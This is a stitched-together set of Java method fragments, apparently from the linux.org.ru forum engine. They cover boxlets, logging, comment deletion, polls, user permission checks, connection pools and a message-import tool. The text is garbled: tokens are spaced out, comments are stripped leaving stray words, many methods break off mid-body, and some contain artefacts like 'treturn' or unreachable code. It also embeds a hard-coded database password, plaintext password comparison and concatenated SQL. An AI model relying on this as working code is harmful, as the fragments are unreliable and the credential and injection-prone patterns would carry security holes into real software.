public String getContent ( Object Config , ProfileHashtable profile ) throws Exception { config = Config ; return getContentImpl ( profile ) ; } 
public String getVariantID ( ProfileHashtable profile , Properties request ) throws UtilException { return "ProfileName="+profile.getStringProperty("ProfileName"); return ""; } 
String getVariantID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException , UtilException { return factory . getVariantID ( name , profile , request ) ; } 
long getVersionID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException { return factory . getVersionID ( name , profile , request ) ; } 
public abstract String getContent ( String name , ProfileHashtable profile ) throws IOException , BoxletException , UtilException ; public abstract String getMenuContent ( String name , ProfileHashtable profile , String addUrl , String removeUrl ) throws IOException , BoxletException , UtilException ; abstract String getVariantID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException , UtilException ; abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException ; } 
public abstract String getMenuContent ( String name , ProfileHashtable profile , String addUrl , String removeUrl ) throws IOException , BoxletException , UtilException ; abstract String getVariantID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException , UtilException ; abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException ; } 
abstract String getVariantID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException , UtilException ; abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException ; } 
abstract long getVersionID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException ; } 
private Boxlet loadBox ( String name ) throws BoxletException { try { Class BoxletFactory = Class . forName ( " ru.org.linux.site.boxes. " + name ) ; 
public String getContent ( String name , ProfileHashtable profile ) throws BoxletException , IOException { Boxlet bx = loadBox ( name ) ; StringBuffer buf = new StringBuffer ( ) ; try { buf . append ( bx . getContent ( config , profile ) ) ; } catch ( Exception e ) { throw new BoxletLoadException ( e ) ; } return buf . toString ( ) ; } 
String getVariantID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException , UtilException { Boxlet bx = loadBox ( name ) ; return bx . getVariantID ( profile , request ) ; } 
long getVersionID ( String name , ProfileHashtable profile , Properties request ) throws BoxletException { Boxlet bx = loadBox ( name ) ; return bx . getVersionID ( profile , request ) ; } 
public synchronized void putObject ( String key , Object obj , long version ) { cache . put ( key , new CacheObject ( obj , version ) ) ; } 
public synchronized void putObject ( String key , CacheObject cobj ) { cache . put ( key , cobj ) ; } 
public synchronized void clear ( ) { cache . clear ( ) ; } 
public void debug ( String app , String message ) { log ( app , DEBUG , message ) ; } 
public void info ( String app , String message ) { log ( app , INFO , message ) ; } 
public void notice ( String app , String message ) { log ( app , NOTICE , message ) ; } 
public void error ( String app , String message ) { log ( app , ERROR , message ) ; } 
public void log ( String app , int level , String message ) { if ( ! closed ) { context . log ( app + " [ " + getLevelName ( level ) + " ] " + message ) ; 
public synchronized void log ( String app , int level , String message ) { Date date = new Date ( ) ; if ( logfile = = null ) { return ; } try { logfile . write ( date + " " + app + " [ " + getLevelName ( level ) + " ] " + message + '' ) ; 
public synchronized void close ( ) { if ( logfile = = null ) { return ; } info ( " logger " , " closed logger " ) ; try { logfile . close ( ) ; } catch ( IOException e ) { } logfile = null ; } 
public String getBanner ( ) throws SQLException { Connection db = config . getConnection ( " banner rotator " ) ; Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT id, banner FROM banners WHERE today>0 AND total>0 ORDER BY total DESC LIMIT 1 " ) ; if ( ! rs . next ( ) ) { return " " ; } String banner = rs . getString ( " banner " ) ; int id = rs . getInt ( " id " ) ; rs . close ( ) ; st . executeUpdate ( " UPDATE banners SET total=total-1,today=today-1 WHERE id= " + id ) ; return ( " <a href= \" /forward.jsp?id= " + id + " \" ><img src= \" " + banner + " \" width= " + width + " height= " + height + " alt=adv border=0></a> " ) ; } 
public boolean isAnonymous ( ) { return " anonymous " . equals ( nick ) | | userScore < User . ANONYMOUS_LEVEL_SCORE ; } 
public String deleteComment ( int msgid , String reason , User user , int scoreBonus ) throws SQLException { st1 . clearParameters ( ) ; st2 . clearParameters ( ) ; st1 . setInt ( 1 , msgid ) ; st2 . setInt ( 1 , msgid ) ; st2 . setInt ( 2 , user . getId ( ) ) ; st2 . setString ( 3 , reason ) ; st4 . setInt ( 1 , scoreBonus ) ; st4 . setInt ( 2 , msgid ) ; st1 . executeUpdate ( ) ; st2 . executeUpdate ( ) ; st4 . executeUpdate ( ) ; logger . notice ( " delete " , " " + msgid + " " + user . getNick ( ) + " ` " + reason + '\'' ) ; return " " + msgid + " " ; } 
public String deleteReplys ( int msgid , User user , boolean score ) throws SQLException { return deleteReplys ( msgid , user , score , 0 ) ; } 
public String deleteReplys ( int msgid , User user , boolean score , int depth ) throws SQLException { List replys = new ArrayList ( ) ; StringBuffer out = new StringBuffer ( ) ; st3 . setInt ( 1 , msgid ) ; ResultSet rs = st3 . executeQuery ( ) ; while ( rs . next ( ) ) { int r = rs . getInt ( " id " ) ; replys . add ( new Integer ( r ) ) ; } rs . close ( ) ; for ( Iterator i = replys . iterator ( ) ; i . hasNext ( ) ; ) { int r = ( ( Integer ) i . next ( ) ) . intValue ( ) ; out . append ( deleteReplys ( r , user , score , depth + + ) ) ; out . append ( " " + r + " <br> " ) ; switch ( depth ) { case 0 : if ( score ) { deleteComment ( r , " 7.1 (, 0) " , user , - 2 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; case 1 : if ( score ) { deleteComment ( r , " 7.1 (, 1) " , user , - 1 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; default : deleteComment ( r , " 7.1 (, >1) " , user , 0 ) ; break ; } } return out . toString ( ) ; } 
public void close ( ) throws SQLException { st1 . close ( ) ; st2 . close ( ) ; st3 . close ( ) ; } 
public void addChild ( CommentNode child ) { childs . add ( child ) ; } 
public void hideAnonymous ( ) { if ( comment ! = null ) { if ( comment . isAnonymous ( ) ) hideNode ( ) ; } if ( comment = = null | | comment . isShowable ( ) ) { for ( Iterator i = childs . iterator ( ) ; i . hasNext ( ) ; ) { 
public void buildList ( List list ) { if ( comment ! = null ) list . add ( comment ) ; for ( Iterator i = childs . iterator ( ) ; i . hasNext ( ) ; ) { CommentNode node = ( CommentNode ) i . next ( ) ; 
public void hideNode ( ) { if ( comment ! = null ) comment . setShow ( false ) ; for ( Iterator i = childs . iterator ( ) ; i . hasNext ( ) ; ) { CommentNode node = ( CommentNode ) i . next ( ) ; 
private void showCommentList ( StringBuffer buf , List comments , boolean reverse ) throws IOException , SQLException , UtilException { if ( reverse ) { Collections . reverse ( comments ) ; } for ( Iterator i = comments . iterator ( ) ; i . hasNext ( ) ; ) { Comment comment = ( Comment ) i . next ( ) ; 
public String showAll ( ) throws IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; List comments = new ArrayList ( COMMENTS_INITIAL_BUFSIZE ) ; while ( rs . next ( ) ) { comments . add ( new Comment ( rs ) ) ; } showCommentList ( buf , comments , false ) ; return buf . toString ( ) ; } 
public synchronized Connection getConnection ( String user ) throws SQLException { if ( db = = null ) { long startMillis = new Date ( ) . getTime ( ) ; db = pool . getConnection ( config , user ) ; logger.notice("config", "opened connection for '"+user+"'"); long endMillis = new Date().getTime(); dbWaitTime = endMillis - startMillis; } return db; } 
public synchronized Connection getConnectionWhois ( ) throws SQLException { if ( db = = null ) { long startMillis = new Date ( ) . getTime ( ) ; db = pool . getConnectionWhois ( config ) ; long endMillis = new Date ( ) . getTime ( ) ; dbWaitTime = endMillis - startMillis ; } return db ; } 
public synchronized void SQLclose ( ) throws SQLException { if ( db ! = null ) { db . close ( ) ; } db = null ; } 
protected synchronized void initDataSource ( Properties config ) { if ( dataSource ! = null ) return ; dataSource = new MyDataSource ( ) ; dataSource . setDataSourceName ( " Main pool " ) ; dataSource . setServerName ( " localhost " ) ; dataSource . setDatabaseName ( " linux " ) ; dataSource . setUser ( config . getProperty ( " JDBC_USER " ) ) ; dataSource . setPassword ( config . getProperty ( " JDBC_PASS " ) ) ; dataSource . setMaxConnections ( 10 ) ; dataSource . setInitialConnections ( 10 ) ; } 
protected synchronized void initDataSourceWhois ( Properties config ) { if ( dataSourceWhois ! = null ) return ; dataSourceWhois = new MyDataSource ( ) ; dataSourceWhois . setDataSourceName ( " Whois pool " ) ; dataSourceWhois . setServerName ( " localhost " ) ; dataSourceWhois . setDatabaseName ( " linux " ) ; dataSourceWhois . setUser ( config . getProperty ( " JDBC_USER " ) ) ; dataSourceWhois . setPassword ( config . getProperty ( " JDBC_PASS " ) ) ; dataSourceWhois . setMaxConnections ( 4 ) ; dataSourceWhois . setInitialConnections ( 4 ) ; } 
public Connection getConnection ( Properties config , String user ) throws SQLException { initDataSource ( config ) ; Connection db ; boolean usePool = " TRUE " . equals ( config . getProperty ( " DB_POOL " ) ) ; if ( usePool ) db = dataSource . getConnection ( ) ; else db = DriverManager . getConnection ( config . getProperty ( " JDBC_URL " ) , config . getProperty ( " JDBC_USER " ) , config . getProperty ( " JDBC_PASS " ) ) ; return db ; } 
public Connection getConnectionWhois ( Properties config ) throws SQLException { initDataSourceWhois ( config ) ; Connection db ; boolean usePool = " TRUE " . equals ( config . getProperty ( " DB_POOL " ) ) ; if ( usePool ) db = dataSourceWhois . getConnection ( ) ; else db = DriverManager . getConnection ( config . getProperty ( " JDBC_URL " ) , config . getProperty ( " JDBC_USER " ) , config . getProperty ( " JDBC_PASS " ) ) ; return db ; } 
protected PGConnectionPoolDataSource createConnectionPool ( ) { PGConnectionPoolDataSource pool = new PGConnectionPoolDataSource ( ) ; pool . setDefaultAutoCommit ( true ) ; return pool ; } 
public static DeleteInfo getDeleteInfo ( Connection db , int msgid ) throws SQLException { PreparedStatement pst = null ; try { pst = db . prepareStatement ( " SELECT nick,reason,users.id as userid FROM del_info,users WHERE msgid=? AND users.id=del_info.delby " ) ; 
public synchronized boolean check ( String ip ) { cleanup ( ) ; if ( hash . containsKey ( ip ) ) return false ; hash . put ( ip , new Date ( ) ) ; return true ; } 
public synchronized void cleanup ( ) { Date current = new Date ( ) ; for ( Iterator i = hash . entrySet ( ) . iterator ( ) ; i . hasNext ( ) ; ) { Map . Entry entry = ( Map . Entry ) i . next ( ) ; 
public boolean isPreformatAllowed ( ) { return preformat ; } 
public boolean isImagePostAllowed ( ) { return imagepost ; } 
public boolean isLinksAllowed ( ) { return havelink ; } 
public boolean isTopicsRestricted ( ) { return restrictTopics ! = 0 ; } 
public static IPBlockInfo getBlockInfo ( Connection db , String addr ) throws SQLException { PreparedStatement st = null ; try { st = db . prepareStatement ( " SELECT reason, ban_date, date, mod_id FROM b_ips WHERE ip = ?::inet " ) ; 
public boolean isBlocked ( ) { return banDate = = null | | banDate . after ( new Date ( ) ) ; } 
public void checkBlock ( ) throws AccessViolationException { if ( isBlocked ( ) ) { throw new AccessViolationException ( " : " + reason ) ; 
public static void checkBlockIP ( Connection db , String addr ) throws AccessViolationException , SQLException { IPBlockInfo block = getBlockInfo ( db , addr ) ; if ( block = = null ) { return ; } block . checkBlock ( ) ; } 
protected void doGet ( HttpServletRequest httpServletRequest , HttpServletResponse httpServletResponse ) throws ServletException , IOException { byte [ ] captchaChallengeAsJpeg = null ; the output stream to render the captcha image as jpeg into ByteArrayOutputStream jpegOutputStream = new ByteArrayOutputStream(); try { get the session id that will identify the generated captcha. the same id must be used to validate the response, the session id is a good candidate! String captchaId = httpServletRequest.getSession().getId(); call the ImageCaptchaService getChallenge method BufferedImage challenge = CaptchaSingleton.getInstance().getImageChallengeForID(captchaId, httpServletRequest.getLocale()); a jpeg encoder JPEGImageEncoder jpegEncoder = JPEGCodec.createJPEGEncoder(jpegOutputStream); jpegEncoder.encode(challenge); } catch (IllegalArgumentException e) { httpServletResponse.sendError(HttpServletResponse.SC_NOT_FOUND); return; } catch (CaptchaServiceException e) { httpServletResponse.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR); return; } captchaChallengeAsJpeg = jpegOutputStream.toByteArray(); flush it in the response httpServletResponse.setHeader("Cache-Control", "no-store"); httpServletResponse.setHeader("Pragma", "no-cache"); httpServletResponse.setDateHeader("Expires", 0); httpServletResponse.setContentType("image/jpeg"); ServletOutputStream responseOutputStream = httpServletResponse.getOutputStream(); responseOutputStream.write(captchaChallengeAsJpeg); responseOutputStream.flush(); responseOutputStream.close(); } 
public boolean isCommentEnabled ( ) { return comment ; } 
public int getNextMessage ( Connection db , int scrollMode ) throws SQLException { final PreparedStatement pst ; switch ( scrollMode ) { case SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT min(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case SCROLL_NOSCROLL : default : return 0 ; } try { ResultSet rs = pst . executeQuery ( ) ; 
public int getPreviousMessage ( Connection db , int scrollMode ) throws SQLException { final PreparedStatement pst ; switch ( scrollMode ) { case SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , section ) ; break ; case SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT max(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case SCROLL_NOSCROLL : default : return 0 ; } try { ResultSet rs = pst . executeQuery ( ) ; 
public void updateMessageText ( Connection db , String text ) throws SQLException { final PreparedStatement pst ; pst = db . prepareStatement ( " UPDATE msgbase SET message=? WHERE id=? " ) ; pst . setString ( 1 , text ) ; pst . setInt ( 2 , msgid ) ; pst . executeUpdate ( ) ; } 
public String showAll ( ) throws IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( ) ) ; } return buf . toString ( ) ; } 
public static int getCurrentPollId ( Connection db ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " select id from votenames where commitdate = (select max(commitdate) from votenames where moderate AND NOT deleted) " ) ; rs . next ( ) ; return rs . getInt ( " id " ) ; } 
public static Poll getCurrentPoll ( Connection db ) throws SQLException { try { return new Poll ( db , getCurrentPollId ( db ) ) ; 
private static int getNextPollId ( Connection db ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " select nextval('vote_id') as voteid " ) ; rs . next ( ) ; return rs . getInt ( " voteid " ) ; } 
public static int createPoll ( Connection db , User user , String title , List pollList ) throws SQLException { int voteid = getNextPollId ( db ) ; PreparedStatement pst = db . prepareStatement ( " INSERT INTO votenames (id, title, topic, groupid, userid, postdate) values (?,?,nextval('s_msgid'), nextval('s_guid'), ?, CURRENT_TIMESTAMP) " ) ; pst . setInt ( 1 , voteid ) ; pst . setString ( 2 , title ) ; pst . setInt ( 3 , user . getId ( ) ) ; pst . executeUpdate ( ) ; try { Poll poll = new Poll ( db , voteid ) ; for ( Iterator i = pollList . iterator ( ) ; i . hasNext ( ) ; ) { String variant = ( String ) i . next ( ) ; if ( variant . trim ( ) . length ( ) = = 0 ) { continue ; } poll . addNewVariant ( db , variant ) ; } } catch ( PollNotFoundException ex ) { throw new RuntimeException ( ex ) ; } return voteid ; } 
public void commit ( Connection db , User commitby ) throws SQLException { PreparedStatement pst = db . prepareStatement ( " UPDATE votenames SET moderate='t', commitby=?, commitdate='now' WHERE id=? " ) ; pst . setInt ( 1 , commitby . getId ( ) ) ; pst . setInt ( 2 , id ) ; PreparedStatement pst2 = db . prepareStatement ( " UPDATE users SET score=score+3 WHERE id IN (SELECT userid FROM votenames WHERE id=?) AND score<300 " ) ; pst2 . setInt ( 1 , id ) ; pst . executeUpdate ( ) ; pst2 . executeUpdate ( ) ; pst . close ( ) ; pst2 . close ( ) ; } 
public List getPollVariants ( Connection db , int order ) throws SQLException { List variants = new ArrayList ( ) ; Statement st = db . createStatement ( ) ; ResultSet rs ; switch ( order ) { case ORDER_ID : rs = st . executeQuery ( " SELECT * FROM votes WHERE vote= " + id + " ORDER BY id " ) ; break ; case ORDER_VOTES : rs = st . executeQuery ( " SELECT * FROM votes WHERE vote= " + id + " ORDER BY votes DESC, id " ) ; break ; default : throw new RuntimeException ( " Oops!? order= " + order ) ; } while ( rs . next ( ) ) { int varId = rs . getInt ( " id " ) ; String label = rs . getString ( " label " ) ; int votes = rs . getInt ( " votes " ) ; variants . add ( new PollVariant ( varId , label , votes ) ) ; } return variants ; } 
public int getMaxVote ( Connection db ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT max(votes) FROM votes WHERE vote= " + id ) ; rs . next ( ) ; int max = rs . getInt ( " max " ) ; if ( max = = 0 ) { max = 1 ; } rs . close ( ) ; st . close ( ) ; return max ; } 
public void addNewVariant ( Connection db , String label ) throws SQLException { PreparedStatement addPst = db . prepareStatement ( " INSERT INTO votes (id, vote, label) values (nextval('votes_id'), ?, ?) " ) ; addPst . clearParameters ( ) ; addPst . setInt ( 1 , id ) ; addPst . setString ( 2 , label ) ; addPst . executeUpdate ( ) ; } 
public void updateLabel ( Connection db , String label ) throws SQLException { if ( this . label . equals ( label ) ) { return ; } PreparedStatement pst = db . prepareStatement ( " UPDATE votes SET label=? WHERE id=? " ) ; pst . setString ( 1 , label ) ; pst . setInt ( 2 , id ) ; pst . executeUpdate ( ) ; this . label = label ; } 
public void remove ( Connection db ) throws SQLException { Statement st = db . createStatement ( ) ; st . executeUpdate ( " DELETE FROM votes WHERE id= " + id ) ; } 
private static synchronized void initServletLogger ( ServletContext context ) { if ( logger = = null ) { logger = new ServletLogger ( context ) ; 
private static synchronized void initProperties ( String configFileName ) throws IOException { File propFile = new File ( configFileName ) ; if ( properties = = null ) { Properties tmp = new Properties ( ) ; 
public Connection getConnection ( String user ) throws SQLException { return config . getConnection ( user ) ; } 
public Connection getConnectionWhois ( ) throws SQLException { return config . getConnectionWhois ( ) ; } 
public String replaceProfile ( HttpServletRequest request , String profile ) { String path = request . getRequestURI ( ) ; REMatch found = profileRE . getMatch ( path ) ; if ( found ! = null ) { String begin = path . substring ( 0 , found . getSubStartIndex ( 1 ) ) ; 
private Map readProfile ( String name ) throws ClassNotFoundException , IOException , StorageException { InputStream df = config . getStorage ( ) . getReadStream ( " profile " , name ) ; ObjectInputStream dof = new ObjectInputStream ( df ) ; Map profile = ( Map ) dof . readObject ( ) ; dof . close ( ) ; df . close ( ) ; return profile ; } 
public void writeProfile ( String name ) throws IOException , AccessViolationException , StorageException { if ( name . charAt ( 0 ) = = '_' ) { throw new AccessViolationException ( " " ) ; } if ( ! StringUtil . checkLoginName ( name ) ) { throw new AccessViolationException ( " " ) ; } if ( " anonymous " . equals ( name ) ) { throw new AccessViolationException ( " " ) ; } userProfile . put ( " system.timestamp " , new Long ( new Date ( ) . getTime ( ) ) ) ; userProfile . remove ( " Storage " ) ; OutputStream df = config . getStorage ( ) . getWriteStream ( " profile " , name ) ; ObjectOutputStream dof = new ObjectOutputStream ( df ) ; dof . writeObject ( userProfile ) ; dof . close ( ) ; df . close ( ) ; userProfile . put ( " Storage " , config . getStorage ( ) ) ; } 
public boolean isSearchMode ( ) { return searchMode ; } 
public boolean isDebugMode ( ) { return debugMode ; } 
public String head ( ) { return " <!DOCTYPE HTML PUBLIC \" -W3CDTD HTML 4.0 TransitionalEN \" \" http:www.w3.org/TR/REC-html40/loose.dtd \" > n<html lang=ru> n<head> " ; } 
public String DocumentHeader ( ) throws IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <link rel= \" search \" title= \" Search L.O.R. \" href= \" search.php \" > " ) ; out . append ( " <link rel= \" top \" title= \" Linux.org.ru \" href= \" index.jsp \" > " ) ; out.append("<a href=\"http:www.centerpress.ru/shop/computer_press/linuxformat/lxf-2007/ref_102196\"><img src=\"http:www.linux.org.ru/adv/linuxformat/lxf2007.gif\"></a>"); banners out.append("</div>"); out.append(FileUtils.readfile(config.getHTMLPathPrefix() + style + "/head-main2.html")); } else { out.append(FileUtils.readfile(config.getHTMLPathPrefix() + style + "/head.html")); } } else { if (isMainPage()) { out.append(FileUtils.readfile(config.getHTMLPathPrefix() + style + "/head-main.html")); } else { out.append(FileUtils.readfile(config.getHTMLPathPrefix() + style + "/head.html")); } } if (!isSearchMode()) { hidden counters if (isMainPage()) { out.append(config.getStorage().readMessage("buttons", "top100-main-hidden")); out.append(config.getStorage().readMessage("buttons", "toplist-main-hidden")); } else { out.append(config.getStorage().readMessage("buttons", "toplist-hidden")); } } return out.toString(); } 
public String DocumentFooter ( boolean closeHtml ) throws IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; if ( isSearchMode ( ) ) { out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } else { out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; } if ( ! isSearchMode ( ) ) { out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); } Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\"></script><script type=\"text/javascript\">_uacct = \"UA-1826606-1\";urchinTracker(); </script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String DocumentFooter ( ) throws IOException , StorageException { return DocumentFooter ( true ) ; } 
public boolean isUsingDefaultProfile ( ) { return usingDefaultProfile ; } 
public static boolean isSessionAuthorized ( HttpSession session ) { return session ! = null & & session . getAttribute ( " login " ) ! = null & & ( ( Boolean ) session . getAttribute ( " login " ) ) . booleanValue ( ) ; } 
public boolean isModeratorSession ( ) { if ( ! isSessionAuthorized ( session ) ) { return false ; } return ( ( Boolean ) session . getValue ( " moderator " ) ) . booleanValue ( ) ; } 
public boolean isAnonymousProfile ( ) { if ( isUsingDefaultProfile ( ) ) { return true ; } return profileName . startsWith ( " _ " ) ; } 
public void checkPassword ( String password ) throws BadPasswordException { if ( blocked ) { throw new BadPasswordException ( nick ) ; } if ( ! password . equals ( this . password ) ) { throw new BadPasswordException ( nick ) ; 
public void checkAnonymous ( ) throws AccessViolationException { if ( anonymous | | blocked ) { throw new AccessViolationException ( " Anonymous user " ) ; 
public void checkBlocked ( ) throws AccessViolationException { if ( blocked ) { throw new AccessViolationException ( " Blocked user " ) ; } if ( ! activated ) { throw new AccessViolationException ( " Not activated user " ) ; 
public void checkCommit ( ) throws AccessViolationException { if ( anonymous | | blocked ) { throw new AccessViolationException ( " Commit access denied for anonymous user " ) ; } if ( ! canmod ) { throw new AccessViolationException ( " Commit access denied for user " + nick + " ( " + id + " ) " ) ; 
public void checkDelete ( ) throws AccessViolationException { if ( anonymous | | blocked ) { throw new AccessViolationException ( " Delete access denied for anonymous user " ) ; } if ( ! candel ) { throw new AccessViolationException ( " Delete access denied for user " + nick + " ( " + id + " ) " ) ; 
public boolean isAnonymous ( ) { return anonymous ; } 
public static void updateUserLastlogin ( Connection dbconn , String nick , Date lTime ) throws SQLException { update lastlogin time in database String sSql = "UPDATE users SET lastlogin=? WHERE nick=?"; PreparedStatement pst = dbconn.prepareStatement(sSql); pst.setTimestamp(1, new Timestamp(lTime.getTime())); pst.setString(2, nick); pst.executeUpdate(); pst.close(); getLogger().notice("template" , "User "+nick+" logged in."); 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } if ( canModerate ( ) ) { return false ; } return maxScore < 100 ; } 
public static User getCurrentUser ( Connection db , HttpSession session ) throws SQLException , UserNotFoundException { if ( ! Template . isSessionAuthorized ( session ) ) { return null ; } return new User ( db , ( String ) session . getAttribute ( " nick " ) ) ; } 
public boolean isActivated ( ) { return activated ; } 
public String getContentImpl ( ProfileHashtable profile ) throws IOException , SQLException , BadDateException { Connection db = null ; try { db = ( ( SQLConfig ) config ) . getConnection ( " archive " ) ; 
public String getContentImpl ( ProfileHashtable profile ) throws IOException , SQLException , StorageException , UtilException { Connection db = null ; try { db = ( ( SQLConfig ) config ) . getConnection ( " fullnews " ) ; 
public String getVariantID ( ProfileHashtable prof , Properties request ) throws UtilException { return " SearchMode= " + prof . getBooleanProperty ( " SearchMode " ) + " &topics= " + prof . getIntProperty ( " topics " ) + " &style= " + prof . getStringProperty ( " style " ) ; } 
public String getContentImpl ( ProfileHashtable profile ) throws IOException , SQLException { Connection db = null ; try { db = ( ( SQLConfig ) config ) . getConnection ( " gallery " ) ; 
public String getVariantID ( ProfileHashtable prof , Properties request ) throws UtilException { return " SearchMode= " + prof . getBooleanProperty ( " SearchMode " ) ; } 
public String getContentImpl ( ProfileHashtable profile ) throws IOException { tStringBuffer out = new StringBuffer ( ) ; out . append ( " <h2><a href= \" http:justnews.ru/ \" >JustNews</a></h2> " ) ; out . append ( FileUtils . readfile ( ( ( PropertiesConfig ) config ) . getProperties ( ) . getProperty ( " PathPrefix " ) + " linux-fetch/headline-justnews.html " ) ) ; treturn out . toString ( ) ; } 
public String getContentImpl ( ProfileHashtable profile ) throws SQLException , UtilException { Connection db = null ; try { db = ( ( SQLConfig ) config ) . getConnection ( " poll " ) ; 
public String getVariantID ( ProfileHashtable prof , Properties request ) throws UtilException { return " SearchMode= " + prof . getBooleanProperty ( " SearchMode " ) ; } 
public String getContentImpl ( ProfileHashtable profile ) throws IOException { tStringBuffer out = new StringBuffer ( ) ; out . append ( " <h2> </h2> " ) ; if ( profile . getStringProperty ( " ProfileName " ) = = null ) out . append ( " -<p> " ) ; telse out . append ( " : <em> " + profile . getStringProperty ( " ProfileName " ) + " </em><p> " ) ; out . append ( " <br><a href= \" edit-profile.jsp \" >...</a> " ) ; out . append ( " <p><strong>:</strong><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile= \" > </a><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile=_white \" > white</a><br> " ) ; out . append ( " *<a href= \" edit-profile.jsp?mode=setup&amp;profile=_white2 \" > white2</a><br> " ) ; treturn out . toString ( ) ; } 
public String getContentImpl ( ProfileHashtable profile ) throws IOException { treturn ( " <h2></h2> <h3> </h3> * <a href= \" /gnome \" >gnome</a><br> * <a href= \" /rc5 \" >rc5</a><br> " ) ; } 
public String getContentImpl ( ProfileHashtable profile ) throws IOException , SQLException , UtilException { Connection db = null ; try { db = ( ( SQLConfig ) config ) . getConnection ( " top10 " ) ; 
public String getVariantID ( ProfileHashtable prof , Properties request ) throws UtilException { return " SearchMode= " + prof . getBooleanProperty ( " SearchMode " ) + " &messages= " + prof . getIntProperty ( " messages " ) + " &style= " + prof . getStringProperty ( " style " ) ; } 
public static void main ( String [ ] args ) throws Exception { logger . info ( " Connecting to DB: " + database ) ; Class . forName ( " org.postgresql.Driver " ) ; Connection db = DriverManager . getConnection ( database , " linuxweb " , " obsidian0 " ) ; PreparedStatement st = db . prepareStatement ( " INSERT INTO msgbase VALUES(?,?) " ) ; File dir = new File ( " /var/www/linux.org.ru/lor-storage/linux-storage/msgbase " ) ; logger . info ( " Reading directory " ) ; String [ ] files = dir . list ( ) ; logger . info ( " Got " + files . length + " files! " ) ; char [ ] buffer = new char [ BUFFER_SIZE ] ; for ( int i = 0 ; i < files . length ; i + + ) { if ( i % 10000 = = 0 ) { logger . info ( " Current msgid = " + files [ i ] + " (i= " + i + ')' ) ; } int msgid = Integer . parseInt ( files [ i ] ) ; if ( msgid > 1279505 ) { continue ; } FileReader reader = new FileReader ( dir . getPath ( ) + '/' + files [ i ] ) ; StringBuffer str = new StringBuffer ( ) ; while ( true ) { int size = reader . read ( buffer ) ; if ( size = = - 1 ) { break ; } str . append ( buffer , 0 , size ) ; } st . setInt ( 1 , msgid ) ; st . setString ( 2 , str . toString ( ) ) ; st . execute ( ) ; st . clearParameters ( ) ; } logger . info ( " Closing connection " ) ; db . close ( ) ; } 
